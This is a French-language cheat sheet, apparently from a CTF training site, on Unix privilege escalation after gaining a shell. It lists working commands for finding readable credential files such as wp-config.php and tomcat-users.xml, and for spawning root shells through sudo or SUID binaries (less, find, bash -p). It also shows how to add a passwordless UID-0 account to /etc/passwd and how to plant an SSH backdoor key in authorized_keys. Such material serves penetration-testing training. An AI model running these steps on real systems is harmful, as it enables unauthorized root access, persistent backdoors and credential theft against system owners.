

<!--- category: PrivEscUx --->
<!--- id: intro --->
<!--- title: Elevation de Privilege - Unix --->
<!--- keywords:  --->
## Elevation de Privilege - Unix

Techniques d'élévation de privilège pour Unix.



<!--- category: PrivEscUx --->
<!--- id: privelev --->
<!--- title: Principe --->
<!--- keywords:  --->
## Principe

Nous venons tout juste d'obtenir l'accès en shell à un serveur. 
Nous allons commencer par faire un inventaire exhaustif de ce qui est accessible au compte sur lequel nous pouvons executer des commandes.<br/>
- Identifier l'OS, sa version, les patchs de sécurité manquants
- Recenser les outils disponibles : netcat, python, perl..
- Lire tous les fichiers de config, temporaires, backup pour trouver des login/password.<br/>
- Utiliser les éventuels droits sudo du compte.<br/>
- Trouver une commande avec SetUID bit.<br/>
- Trouver un process qui tourne en tache de fond avec des droits root et modifier ses inputs.<br/>
- Trouver un exploit kernel. Cette dernière option, radicale car elle peut planter la machine, est trés efficace sur les vieux serveurs...

Sur ses premières machines, il est préférable de faire ces énumérations en lançant les commandes manuellement pour s'approprier les options et les outputs. Une fois à l'aise, et sachant ce que l'on cherche, il est possible d'utiliser des scripts qui font ces énumérations pour nous.



<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: Fichiers contenant des informations --->
<!--- keywords:  --->
## Fichiers contenant des informations



<!--- category: PrivEscUx --->
<!--- id: fichiers --->
<!--- title: Fichiers intéressants: txt, cfg,... --->
<!--- keywords:  --->
## Fichiers intéressants: txt, cfg,...

Rechercher les fichiers .txt ou .cfg, appartanant aux autres comptes, avec des droits en lecture trop ouverts.
```
find /home -readable -type f  \( -iname \*.txt -o -iname \*.cfg \) 2>/dev/null
find /home -E . -regex '.*\.(txt|cfg)' 2>/dev/null
```
  



<!--- category: PrivEscUx --->
<!--- id: wordpress --->
<!--- title: Web app: Wordpress --->
<!--- keywords:  --->
## Web app: Wordpress

Le fichier de config d'une appli wordpress s'appelle:
```
wp-config.php
```
    
Pour le chercher:
 ```
find /var -name wp-config.php 2>/dev/null
```

Ce fichier contient les login/password pour se connecter à la base de donnée. Il est possible de dumper la base de donnée et récupérer les login et hashes des comptes wordpress.



<!--- category: PrivEscUx --->
<!--- id: apache --->
<!--- title: Web server: Apache --->
<!--- keywords:  --->
## Web server: Apache

Le fichier de config peut porter deux noms:
```
httpd.conf
apache2.conf
```
    
On le trouve généralement dans un des répertoires:
```
/etc/apache2/httpd.conf
/etc/apache2/apache2.conf
/etc/httpd/httpd.conf
/etc/httpd/conf/httpd.conf
```




<!--- category: PrivEscUx --->
<!--- id: tomcat --->
<!--- title: Web server: Tomcat --->
<!--- keywords:  --->
## Web server: Tomcat

Le fichier de config porte le nom:
```
server.xml
```
 
Les mots de passe des utilisateurs se trouvent dans:
```
tomcat-users.xml
```
 
On trouve généralement ces fichiers dans un des répertoires:
```
TOMCAT-HOME/conf/
/usr/local/tomcat/conf/
```




<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: Sudo --->
<!--- keywords:  --->
## Sudo



<!--- category: PrivEscUx --->
<!--- id: sudo --->
<!--- title: Sudo --->
<!--- keywords:  --->
## Sudo

Sudo permet de lancer des commandes en tant qu'un autre utilisateur.<br/>
<br/>
Pour connaitre les droits sudo de votre compte, il faut lancer la commande sudo -l. Il est parfois demandé de saisir votre mot de passe.
```
sudo -l
L'utilisateur user1 peut utiliser les commandes suivantes sur target-host :
    (ALL) NOPASSWD: /usr/bin/find
    user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py
```


La première ligne est: (ALL) NOPASSWD: /usr/bin/find    
Il est possible de lancer la commande /usr/bin/find en tant que n'importe quel utilisateur du serveur, en particulier root.     
```
sudo /usr/bin/find  
```

    
user2 NOPASSWD: /usr/bin/python3 /home/user2/run.py
Il est ici possible de lancer la commande '/usr/bin/python3 /home/user2/run.py' en tant que user2.    
Pour celà on utilise la commande 'sudo' avec le flag '-u user2'
```
sudo -u user2 /usr/bin/python3  /home/user2/run.py 
```


Si l'option NOPASSWD est définie, vous n'avez pas à saisir de mots de passe. Sinon, la commande sudo demande le mot de passe du compte courant. Si vous être entré par un webshell, ou une connection ssh avec clef privée, il faudra se débrouiller pour connaitre le mot de passe.    



<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: SetUID bit --->
<!--- keywords:  --->
## SetUID bit



<!--- category: PrivEscUx --->
<!--- id: setUID --->
<!--- title: SetUID bits --->
<!--- keywords:  --->
## SetUID bits

Identifier les process possédant un setUID bit
```
find / -perm -4000 -exec ls -al {} \; 2>/dev/null
```

Que faire avec un binaire possédant un setUID bit ?
```
- Lancer un shell
- Lire un flag
- Copier un fichier
- Ajouter une ligne à un fichier : /etc/sudoers, /etc/passwd, ~/.ssh/authorized_keys
- ...
```




<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: SUID/Sudo exploitation --->
<!--- keywords:  --->
## SUID/Sudo exploitation



<!--- category: PrivEscUx --->
<!--- id: shell --->
<!--- title: Process permettant de lancer un shell --->
<!--- keywords:  --->
## Process permettant de lancer un shell

De nombreux process permettent de lancer un shell. Idéal s'ils sont en sudo ou avec un setUID bit.
```
- find
- nmap
- vi
- less
- awk
- tee
...
```

Reference: https://gtfobins.github.io/



<!--- category: PrivEscUx --->
<!--- id: less --->
<!--- title: Sudo/SUID bit - less --->
<!--- keywords:  --->
## Sudo/SUID bit - less

Less peut être utilisé pour lire des fichiers. Presser q pour sortir du lecteur.
```
./less flag.txt
```

ou pour obtenir un shell en ouvrant un fichier, et une fois dans le lecteur ouvrir un shell en tapant !/bin/sh
```
./less fichier
!/bin/sh
```




<!--- category: PrivEscUx --->
<!--- id: privbash --->
<!--- title: Sudo/SUID bit - bash --->
<!--- keywords:  --->
## Sudo/SUID bit - bash

Lancé par sudo ou avec un SUID bit, bash va dropper ses privilèges. Pour garder l'identifiant root, utiliser l'option -p.
```
sudo -yolo /bin/bash -p
```

```
./bash -p
```




<!--- category: PrivEscUx --->
<!--- id: findsh --->
<!--- title: Sudo/SUID bit - find --->
<!--- keywords:  --->
## Sudo/SUID bit - find

Il est possible d'utiliser la commande -exec de find pour ouvrir un shell.   
On recherche n'importe quel fichier, et c'est un prétexte pour lancer la commande /bin/sh.   
Ici avec un sudo, le shell sera ouvert en tant que user2:   
```
sudo -u user /usr/bin/find . -name readme.txt -exec /bin/sh \;
```

Si on trouve la commande find, copiée dans un répertoire avec le SUID bit actif, on l'exploite de la même façon:
```
./find . -name readme.txt -exec /bin/sh \;
```




<!--- category: PrivEscUx --->
<!--- id: etcpasswd --->
<!--- title: Ajouter un user root sans mot de passe --->
<!--- keywords:  --->
## Ajouter un user root sans mot de passe

Vous disposez des droits pour modifier /etc/passwd. Par exemple tee avec un sudo en root.
Ajoutez une entrée avec un UID de 0, et un mot de passe vide.
```
echo myroot::0:0:::/bin/bash | sudo tee -a /etc/passwd 
su myroot 
```




<!--- category: PrivEscUx --->
<!--- id: pubkey --->
<!--- title: Ajouter une backdoor ssh en injectant une clef publique. --->
<!--- keywords:  --->
## Ajouter une backdoor ssh en injectant une clef publique.

Si une commande avec les droits root permet d'ajouter une ligne: ex: tee
```
echo 'ssh-rsa AAAAB3[...]CHN2CpQ== yolo@yolospacehacker.com' | sudo tee -a /home/victim/.ssh/authorized_keys
ssh -i id_rsa victim@iptarget
```




<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: Exploitation de process --->
<!--- keywords:  --->
## Exploitation de process



<!--- category: PrivEscUx --->
<!--- id: ps --->
<!--- title: ps --->
<!--- keywords:  --->
## ps

Identifier les process lancés par root
```
ps eaxf
```

Une fois un process identifé, regarder s'il est possible de modifier les fichiers lus par le process, ou si le process a des vulnérabilités connues.



<!--- category: PrivEscUx --->
<!--- id: cron --->
<!--- title: Cron --->
<!--- keywords:  --->
## Cron

Identifier les taches lancées par cron.
```
cat /etc/cron.d/*
cat /var/spool/cron/*
crontab -l
cat /etc/crontab
cat /etc/cron.(time)
systemctl list-timers
```




<!--- category: PrivEscUx --->
<!--- id: process --->
<!--- title: Process Spy --->
<!--- keywords:  --->
## Process Spy

With the ps command, you may miss a small process, launched every 2 minutes, which will process a batch file in 5 seconds before disappearing.
The pspy tool monitors the processes for you.
```
https://github.com/DominicBreuker/pspy
```




<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: Kernel exploit --->
<!--- keywords:  --->
## Kernel exploit



<!--- category: PrivEscUx --->
<!--- id: os --->
<!--- title: Kernel exploit --->
<!--- keywords:  --->
## Kernel exploit

Linux Distib version:
```
cat /etc/issue
Ubuntu 18.04.3 LTS 
```

Linux kernel version: 5.0.0-37-generic
```
uname -a
Linux yoloctf-server 5.0.0-37-generic #40~18.04.1-Ubuntu SMP Thu Nov 14 12:06:39 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

Once the kernel version is known, it is possible to search for a kernel exploit<br/>
https://github.com/SecWiki/linux-kernel-exploits<br/>
Never run an unknown binary !<br/>
Get the sources, read them, understand what they do, compile yourself, and only then run them... Knowing that there is a high risk of crashing the server.



<!--- category: PrivEscUx --->
<!--- id: section --->
<!--- title: Enumeration scripts --->
<!--- keywords:  --->
## Enumeration scripts



<!--- category: PrivEscUx --->
<!--- id: linenum --->
<!--- title: Enum scripts --->
<!--- keywords:  --->
## Enum scripts

Some well known script automate the enumeration process.<br/>
Test them and find the one that suits you best.
```
linPeass : https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
LinEnum.sh : https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
linuxprivchecker.py : https://github.com/sleventyeleven/linuxprivchecker
unixprivesc.sh : https://github.com/pentestmonkey/unix-privesc-check
lse.sh : https://github.com/diego-treitos/linux-smart-enumeration
```


